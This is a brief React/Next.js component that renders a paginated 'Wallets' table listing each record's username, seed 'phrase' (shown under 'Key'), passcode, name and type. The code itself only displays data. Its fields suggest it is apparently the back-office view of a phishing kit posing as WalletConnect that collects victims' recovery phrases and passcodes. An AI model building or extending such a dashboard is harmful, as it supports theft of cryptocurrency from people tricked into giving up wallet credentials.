"use client";
import styles from "./styles.module.scss";
import { WalletConnectResponseType } from "@/app/components/js/dataTypes";
import { useState } from "react";
import Paginate from "@/app/components/js/pager/Paginate";

export default function Body({
  wallets,
}: {
  wallets: WalletConnectResponseType[];
}) {
  const [pageWallets, setPageWallets] = useState<WalletConnectResponseType[]>(
    []
  );

  return (
    <div className={styles.main}>
      <h1>Wallets</h1>
      <div className={styles.table}>
        <div className={styles.row}>
          <span>Username</span>
          <span>Key</span>
          <span>Passcode</span>
          <span>Name</span>
          <span>Type</span>
        </div>

        {pageWallets.map((wallet) => {
          return (
            <div className={styles.row} key={wallet._id}>
              <span>{wallet.username}</span>
              <span>{wallet.phrase}</span>
              <span>{wallet.passcode}</span>
              <span>{wallet.name}</span>
              <span>{wallet.type}</span>
            </div>
          );
        })}
      </div>
      <Paginate data={wallets} setData={setPageWallets} />
    </div>
  );
}
